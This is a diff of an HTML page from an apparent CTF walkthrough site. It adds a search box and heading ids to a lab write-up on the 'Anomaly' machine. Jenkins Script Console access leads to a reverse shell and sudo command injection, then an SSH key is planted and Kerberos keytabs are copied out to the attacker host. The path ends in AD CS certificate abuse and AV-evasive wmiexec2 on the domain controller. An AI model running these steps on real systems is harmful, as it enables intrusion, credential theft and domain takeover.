@@ -144,6 +144,16 @@
     <span class="cursor" id="term-cursor" aria-hidden="true"></span>
     <span class="sr-only">Zerotrace Logs</span>
   </h1>
+  <!-- Search Box -->
+  <div class="search-container">
+    <input type="search"
+           id="siteSearch"
+           class="search-input"
+           placeholder="Search walkthroughs..."
+           aria-label="Search walkthroughs"
+           autocomplete="off">
+    <div id="searchResults" class="search-results" hidden></div>
+  </div>
 </header>
 
 <!-- Side hamburger control -->
@@ -200,7 +210,7 @@
 <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
 
 <section>
-  <h2>Anomaly</h2>
+  <h2 id="anomaly">Anomaly</h2>
 
   <div class="machine-info">
     <ul>
@@ -211,7 +221,7 @@
     </ul>
   </div>
 
-  <h3>Overview</h3>
+  <h3 id="overview">Overview</h3>
   <p>This engagement simulates an external attacker progressing from an initial foothold on a Linux server to full Domain Administrator privileges over an Active Directory environment. The attack path involves exploiting a misconfigured Jenkins instance, pivoting through Kerberos credentials stored on the Linux host, and ultimately abusing vulnerable Active Directory Certificate Services (AD CS) templates to compromise the domain.</p>
 
   <p><strong>In-Scope Targets:</strong></p>
@@ -220,9 +230,9 @@
     <li><strong>Domain Controller (10.1.111.50)</strong> - Final target with active AV</li>
   </ul>
 
-  <h2>Reconnaissance</h2>
+  <h2 id="reconnaissance">Reconnaissance</h2>
 
-  <h3><span class="step">[Step 1]</span> Ubuntu Server Enumeration</h3>
+  <h3 id="ubuntu-server-enumeration"><span class="step">[Step 1]</span> Ubuntu Server Enumeration</h3>
   <p>I started with a full port scan against the Ubuntu server using <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a>:</p>
   <pre><code>$ nmap -p- -T4 -sC -sV 10.1.167.185 -oN nmap_scan_ubuntu</code></pre>
 
@@ -239,7 +249,7 @@
     <li>Jetty web server on port 8080 (commonly used by Jenkins)</li>
   </ul>
 
-  <h3><span class="step">[Step 2]</span> Domain Controller Enumeration</h3>
+  <h3 id="domain-controller-enumeration"><span class="step">[Step 2]</span> Domain Controller Enumeration</h3>
   <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.111.50 -oN nmap_scan_DC</code></pre>
 
   <pre><code>PORT      STATE SERVICE       VERSION
@@ -264,9 +274,9 @@
     <li>Standard AD ports exposed</li>
   </ul>
 
-  <h2>Initial Access - Jenkins RCE</h2>
+  <h2 id="initial-access-jenkins-rce">Initial Access - Jenkins RCE</h2>
 
-  <h3><span class="step">[Step 3]</span> Jenkins Default Credentials</h3>
+  <h3 id="jenkins-default-credentials"><span class="step">[Step 3]</span> Jenkins Default Credentials</h3>
   <p>Browsing to port 8080 on the Ubuntu server revealed a Jenkins login page. I tested default credentials and successfully authenticated with <code>admin:[REDACTED]</code>.</p>
 
   <div class="question">
@@ -276,7 +286,7 @@
     Jenkins is an open-source automation server commonly used for CI/CD pipelines. When misconfigured with default credentials, attackers can leverage its Script Console to execute arbitrary code on the underlying server.
   </div>
 
-  <h3><span class="step">[Step 4]</span> Exploiting the Script Console</h3>
+  <h3 id="exploiting-the-script-console"><span class="step">[Step 4]</span> Exploiting the Script Console</h3>
   <p>After logging in, I navigated to <strong>Manage Jenkins</strong> and accessed the <strong>Script Console</strong>.</p>
 
   <p><img src="../assets/anomaly/jenkins-script-console.png" alt="Jenkins Manage page showing Script Console option"></p>
@@ -307,7 +317,7 @@ connect to [10.200.26.123] from (UNKNOWN) [10.1.167.185] 45432</code></pre>
   <pre><code>> whoami
 jenkins</code></pre>
 
-  <h3><span class="step">[Step 5]</span> Shell Upgrade</h3>
+  <h3 id="shell-upgrade"><span class="step">[Step 5]</span> Shell Upgrade</h3>
   <p>I upgraded the basic shell to a fully interactive TTY:</p>
 
   <pre><code>> python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
@@ -326,16 +336,16 @@ $ export TERM=xterm-256color</code></pre>
     A raw netcat shell lacks features like tab completion, command history, and proper signal handling. Upgrading to a PTY shell provides a more stable, interactive experience and prevents accidental disconnection from pressing <code>Ctrl+C</code>.
   </div>
 
-  <h2>Privilege Escalation - Ubuntu Server</h2>
+  <h2 id="privilege-escalation-ubuntu-server">Privilege Escalation - Ubuntu Server</h2>
 
-  <h3><span class="step">[Step 6]</span> Enumerating Sudo Privileges</h3>
+  <h3 id="enumerating-sudo-privileges"><span class="step">[Step 6]</span> Enumerating Sudo Privileges</h3>
   <pre><code>jenkins@ip-10-1-167-185:~$ sudo -l
 User jenkins may run the following commands on ip-10-1-167-185:
     (ALL) NOPASSWD: /usr/bin/router_config</code></pre>
 
   <p>The <code>jenkins</code> user can run <code>/usr/bin/router_config</code> as root without a password.</p>
 
-  <h3><span class="step">[Step 7]</span> Command Injection in router_config</h3>
+  <h3 id="command-injection-in-router-config"><span class="step">[Step 7]</span> Command Injection in router_config</h3>
   <p>The <code>router_config</code> binary is vulnerable to command injection. I exploited it by injecting a bash command:</p>
 
   <pre><code>jenkins@ip-10-1-167-185:~$ sudo /usr/bin/router_config 'test; /bin/bash'
@@ -355,7 +365,7 @@ root</code></pre>
 
   <p><strong>User flag</strong> obtained from <code>/root/</code>.</p>
 
-  <h3><span class="step">[Step 8]</span> Establishing Persistence</h3>
+  <h3 id="establishing-persistence"><span class="step">[Step 8]</span> Establishing Persistence</h3>
   <p>For easier access, I added my SSH public key to the root user's authorized_keys:</p>
 
   <pre><code># echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAbgzJ34oT7llfAY49W+qFJJ2JG7HSod9qQPr33tkwH6 kali@kali" >> /root/.ssh/authorized_keys</code></pre>
@@ -364,9 +374,9 @@ root</code></pre>
   <pre><code>$ ssh -i ~/.ssh/id_ed25519 root@10.1.167.185
 root@ip-10-1-167-185:~#</code></pre>
 
-  <h2>Lateral Movement - Kerberos Keytab Discovery</h2>
+  <h2 id="lateral-movement-kerberos-keytab-discovery">Lateral Movement - Kerberos Keytab Discovery</h2>
 
-  <h3><span class="step">[Step 9]</span> Locating Kerberos Keytabs</h3>
+  <h3 id="locating-kerberos-keytabs"><span class="step">[Step 9]</span> Locating Kerberos Keytabs</h3>
   <p>Since both machines are in scope and likely connected, I searched for Active Directory integration artifacts on the Ubuntu server.</p>
 
   <pre><code># find / -name "*keytab*" -ls 2>/dev/null
@@ -379,7 +389,7 @@ root@ip-10-1-167-185:~#</code></pre>
     A keytab file contains Kerberos principal names and their encrypted keys. When a Linux server is joined to Active Directory, keytab files are used for passwordless authentication. If compromised, attackers can use them to authenticate as the stored principal without knowing the password.
   </div>
 
-  <h3><span class="step">[Step 10]</span> Extracting Principal Information</h3>
+  <h3 id="extracting-principal-information"><span class="step">[Step 10]</span> Extracting Principal Information</h3>
   <pre><code># klist -k -t /etc/krb5.keytab
 Keytab name: FILE:/etc/krb5.keytab
 KVNO Timestamp         Principal
@@ -388,7 +398,7 @@ KVNO Timestamp         Principal
 
   <p>I found a keytab for the domain user <code>Brandon_Boyd</code>.</p>
 
-  <h3><span class="step">[Step 11]</span> Obtaining a Kerberos Ticket</h3>
+  <h3 id="obtaining-a-kerberos-ticket"><span class="step">[Step 11]</span> Obtaining a Kerberos Ticket</h3>
   <pre><code># kinit Brandon_Boyd@ANOMALY.HSM -k -t /etc/krb5.keytab
 # klist
 Ticket cache: FILE:/tmp/krb5cc_0
@@ -402,7 +412,7 @@ Valid starting     Expires            Service principal
   <pre><code># scp -P 2222 /tmp/krb5cc_0 kali@10.200.26.123:/tmp/
 # scp -P 2222 /etc/krb5.keytab kali@10.200.26.123:/tmp/</code></pre>
 
-  <h3><span class="step">[Step 12]</span> Extracting Hashes from Keytab</h3>
+  <h3 id="extracting-hashes-from-keytab"><span class="step">[Step 12]</span> Extracting Hashes from Keytab</h3>
   <p>Using <code>keytabextract.py</code> from <a href="https://github.com/sosdave/KeyTabExtract" target="_blank" rel="noopener noreferrer">KeyTabExtract</a>, I extracted the AES256 hash:</p>
 
   <pre><code>$ python3 keytabextract.py /tmp/krb5.keytab
@@ -412,16 +422,16 @@ Valid starting     Expires            Service principal
         SERVICE PRINCIPAL : Brandon_Boyd/
         AES-256 HASH : [REDACTED]</code></pre>
 
-  <h2>Domain Enumeration</h2>
+  <h2 id="domain-enumeration">Domain Enumeration</h2>
 
-  <h3><span class="step">[Step 13]</span> Validating Kerberos Authentication</h3>
+  <h3 id="validating-kerberos-authentication"><span class="step">[Step 13]</span> Validating Kerberos Authentication</h3>
   <p>I set up my attack machine to use the stolen credential cache:</p>
 
   <pre><code>$ export KRB5CCNAME=/tmp/krb5cc_0</code></pre>
 
   <p><img src="../assets/anomaly/kerberos-smb-auth.png" alt="Successful SMB authentication using Kerberos ticket"></p>
 
-  <h3><span class="step">[Step 14]</span> User Enumeration via SMB</h3>
+  <h3 id="user-enumeration-via-smb"><span class="step">[Step 14]</span> User Enumeration via SMB</h3>
   <p>Using <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a> with Kerberos authentication, I enumerated domain users:</p>
 
   <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd --use-kcache --users</code></pre>
@@ -444,20 +454,20 @@ anna_molly         2025-11-12 20:29:16 0</code></pre>
 
   <p><img src="../assets/anomaly/user-enum-password.png" alt="User enumeration showing password in description field"></p>
 
-  <h3><span class="step">[Step 15]</span> Credential Validation</h3>
+  <h3 id="credential-validation"><span class="step">[Step 15]</span> Credential Validation</h3>
   <pre><code>$ nxc smb 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]'
 SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:[REDACTED]</code></pre>
 
-  <h3><span class="step">[Step 16]</span> BloodHound Collection</h3>
+  <h3 id="bloodhound-collection"><span class="step">[Step 16]</span> BloodHound Collection</h3>
   <p>I collected Active Directory data for <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> analysis:</p>
 
   <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' --bloodhound --collection All --dns-server 10.1.111.50</code></pre>
 
   <p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a> analysis did not reveal any direct privilege escalation paths, so I pivoted to checking for AD CS vulnerabilities.</p>
 
-  <h2>Domain Privilege Escalation - AD CS Exploitation</h2>
+  <h2 id="domain-privilege-escalation-ad-cs-exploitation">Domain Privilege Escalation - AD CS Exploitation</h2>
 
-  <h3><span class="step">[Step 17]</span> Certificate Template Enumeration</h3>
+  <h3 id="certificate-template-enumeration"><span class="step">[Step 17]</span> Certificate Template Enumeration</h3>
   <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>, I scanned for vulnerable certificate templates:</p>
 
   <pre><code>$ certipy find -u Brandon_Boyd@anomaly.hsm -p '[REDACTED]' -dc-ip 10.1.111.50 -vulnerable</code></pre>
@@ -498,7 +508,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\Brandon_Boyd:[REDACTED]</
 
   <p>The <code>CertAdmin</code> template is vulnerable, and <code>Domain Computers</code> have the necessary permissions to exploit it.</p>
 
-  <h3><span class="step">[Step 18]</span> Checking Machine Account Quota</h3>
+  <h3 id="checking-machine-account-quota"><span class="step">[Step 18]</span> Checking Machine Account Quota</h3>
   <p>Using <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a>:</p>
   <pre><code>$ nxc ldap 10.1.111.50 -u Brandon_Boyd -p '[REDACTED]' -M maq
 MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
@@ -510,7 +520,7 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
     By default, any authenticated domain user can add up to 10 computer accounts to the domain. This is controlled by the <code>ms-DS-MachineAccountQuota</code> attribute. Attackers exploit this to create computer accounts they fully control.
   </div>
 
-  <h3><span class="step">[Step 19]</span> Adding a Computer Account</h3>
+  <h3 id="adding-a-computer-account"><span class="step">[Step 19]</span> Adding a Computer Account</h3>
   <p>Using <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a>:</p>
   <pre><code>$ impacket-addcomputer -computer-name 'BRANDON-PC$' -computer-pass 'Zerotrace123!' \
     ANOMALY.HSM/Brandon_Boyd:'[REDACTED]' -dc-ip 10.1.111.50
@@ -520,7 +530,7 @@ MAQ   10.1.111.50   389   ANOMALY-DC   MachineAccountQuota: 10</code></pre>
   <pre><code>$ nxc smb 10.1.111.50 -u 'BRANDON-PC$' -p 'Zerotrace123!'
 SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!</code></pre>
 
-  <h3><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
+  <h3 id="certificate-request-for-domain-admin"><span class="step">[Step 20]</span> Certificate Request for Domain Admin</h3>
   <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>, I first attempted to impersonate the Administrator account, but authentication failed (likely disabled or restricted):</p>
 
   <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
@@ -533,12 +543,12 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
 
   <p>The <code>KDC_ERR_CLIENT_REVOKED</code> error indicates the Administrator account is disabled or locked.</p>
 
-  <h3><span class="step">[Step 21]</span> Finding Alternative Domain Admin</h3>
+  <h3 id="finding-alternative-domain-admin"><span class="step">[Step 21]</span> Finding Alternative Domain Admin</h3>
   <p>Using <a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound</a>, I identified another Domain Admin: <code>anna_molly</code>.</p>
 
   <p><img src="../assets/anomaly/bloodhound-anna-molly.png" alt="BloodHound showing anna_molly as Domain Admin with SID"></p>
 
-  <h3><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
+  <h3 id="requesting-certificate-as-anna-molly"><span class="step">[Step 22]</span> Requesting Certificate as anna_molly</h3>
   <p>Using <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer">Certipy</a>:</p>
   <pre><code>$ certipy req -u 'BRANDON-PC$@ANOMALY.HSM' -p 'Zerotrace123!' \
     -dc-ip 10.1.111.50 -target 'ANOMALY-DC.anomaly.hsm' \
@@ -549,7 +559,7 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
 [*] Got certificate with UPN 'anna_molly@anomaly.hsm'
 [*] Wrote certificate and private key to 'anna_molly.pfx'</code></pre>
 
-  <h3><span class="step">[Step 23]</span> Authenticating and Extracting Hash</h3>
+  <h3 id="authenticating-and-extracting-hash"><span class="step">[Step 23]</span> Authenticating and Extracting Hash</h3>
   <pre><code>$ certipy auth -pfx anna_molly.pfx -dc-ip 10.1.111.50
 [*] Got TGT
 [*] Saving credential cache to 'anna_molly.ccache'
@@ -564,9 +574,9 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
 
   <p><img src="../assets/anomaly/netexec-pwned.png" alt="NetExec confirming Pwn3d status with anna_molly hash"></p>
 
-  <h2>Domain Controller Access - AV Evasion</h2>
+  <h2 id="domain-controller-access-av-evasion">Domain Controller Access - AV Evasion</h2>
 
-  <h3><span class="step">[Step 24]</span> Using wmiexec2 for Evasion</h3>
+  <h3 id="using-wmiexec2-for-evasion"><span class="step">[Step 24]</span> Using wmiexec2 for Evasion</h3>
   <p>Since the Domain Controller has active antivirus, I used <a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a>, an obfuscated version of wmiexec designed to evade detection.</p>
 
   <div class="question">
@@ -585,12 +595,12 @@ SMB   10.1.111.50   445   ANOMALY-DC   [+] anomaly.hsm\BRANDON-PC$:Zerotrace123!
 [*] Launching wmiexec2
 C:\></code></pre>
 
-  <h2>Root Flag</h2>
+  <h2 id="root-flag">Root Flag</h2>
   <pre><code>C:\> cd C:\Users\Administrator\Desktop
 C:\Users\Administrator\Desktop> type root.txt
 [FLAG REDACTED]</code></pre>
 
-  <h2>Key Takeaways</h2>
+  <h2 id="key-takeaways">Key Takeaways</h2>
   <ol class="takeaways-list">
     <li><strong>Default credentials</strong> on Jenkins provided initial access - always change default passwords</li>
     <li><strong>Kerberos keytabs</strong> on Linux servers joined to AD can expose domain credentials</li>
@@ -600,7 +610,7 @@ C:\Users\Administrator\Desktop> type root.txt
     <li><strong>AV evasion</strong> tools like wmiexec2 can bypass endpoint protection when standard tools are blocked</li>
   </ol>
 
-  <h2>Tools Used</h2>
+  <h2 id="tools-used">Tools Used</h2>
   <ul class="tools-grid">
     <li><a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> - Network scanning</li>
     <li><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec (nxc)</a> - SMB/LDAP enumeration</li>
@@ -611,7 +621,7 @@ C:\Users\Administrator\Desktop> type root.txt
     <li><a href="https://github.com/ice-wzl/wmiexec2" target="_blank" rel="noopener noreferrer">wmiexec2</a> - AV-evasive WMI execution</li>
   </ul>
 
-  <h2>Attack Path Summary</h2>
+  <h2 id="attack-path-summary">Attack Path Summary</h2>
   <div class="attack-diagram">
     <pre><code>Jenkins (Default Creds: admin:[REDACTED])
          |
